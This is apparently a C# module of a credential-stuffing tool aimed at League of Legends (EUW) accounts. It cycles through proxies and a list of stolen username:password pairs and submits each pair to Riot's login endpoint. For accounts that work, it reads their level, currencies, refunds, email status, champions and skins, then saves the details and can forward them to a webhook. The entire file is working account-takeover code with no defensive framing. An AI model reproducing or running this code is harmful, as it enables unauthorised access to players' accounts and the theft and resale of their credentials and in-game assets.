using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Leageoflegendsmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            var str = string.Concat(
                                "client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=EUW1|",
                                array[0], "&password=", array[1],
                                "&scope=openid offline_access lol ban profile email phone");
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var text2 = req.Post("https://auth.riotgames.com/token", str,
                                "application/x-www-form-urlencoded").ToString();
                            if (text2.Contains("invalid_credentials"))
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                            else
                            {
                                if (text2.Contains("access_token"))
                                {
                                    var str2 = Parse(text2, "access_token\":\"", "\",\"");
                                    req.AddHeader("Authorization", "Bearer " + str2);
                                    var text3 = req
                                        .Get(
                                            "https://store.euw1.lol.riotgames.com/storefront/v3/history/purchase?language=de_DE")
                                        .ToString();
                                    if (text3.Contains("accountId"))
                                    {
                                        var text4 = Parse(text3, "summonerLevel\":", "}");
                                        var text5 = Parse(text3, "ip\":", ",\"");
                                        var text6 = Parse(text3, "rp\":", ",\"");
                                        var text7 = Parse(text3, "refundCreditsRemaining\":", ",\"");
                                        req.AddHeader("Authorization", "Bearer " + str2);
                                        var source = req
                                            .Get("https://email-verification.riotgames.com/api/v1/account/status")
                                            .ToString();
                                        var text8 = Parse(source, "emailVerified\":", "}");
                                        req.AddHeader("Authorization", "Bearer " + str2);
                                        var source2 = req
                                            .Get(
                                                "https://euw1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION&language=en_US")
                                            .ToString();
                                        var text9 = Regex.Matches(Parse(source2, "items\":{\"", "false}]"), "itemId\":")
                                            .Count.ToString();
                                        req.AddHeader("Authorization", "Bearer " + str2);
                                        var source3 = req
                                            .Get(
                                                "https://euw1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION_SKIN&language=en_US")
                                            .ToString();
                                        var text10 = Regex
                                            .Matches(Parse(source3, "items\":{\"", "false}]"), "itemId\":").Count
                                            .ToString();
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Lol(euw)_hits",
                                            array[0] + ":" + array[1] + " | Level: " + text4 + " | BE: " + text5 +
                                            " | Rp: " + text6 + " | RefundsRemaing: " + text7 + " | EmailVerified: " +
                                            text8 + " | Champs " + text9 + " | Skins: " + text10);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Lol(euw)",
                                                array[0] + ":" + array[1] + " | Level: " + text4 + " | BE: " + text5 +
                                                " | Rp: " + text6 + " | RefundsRemaing: " + text7 +
                                                " | EmailVerified: " + text8 + " | Champs " + text9 + " | Skins: " +
                                                text10);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(
                                                array[0] + ":" + array[1] + " | Level: " + text4 + " | BE: " + text5 +
                                                " | Rp: " + text6 + " | RefundsRemaing: " + text7 +
                                                " | EmailVerified: " + text8 + " | Champs " + text9 + " | Skins: " +
                                                text10, "Lol(euw) Hits");
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}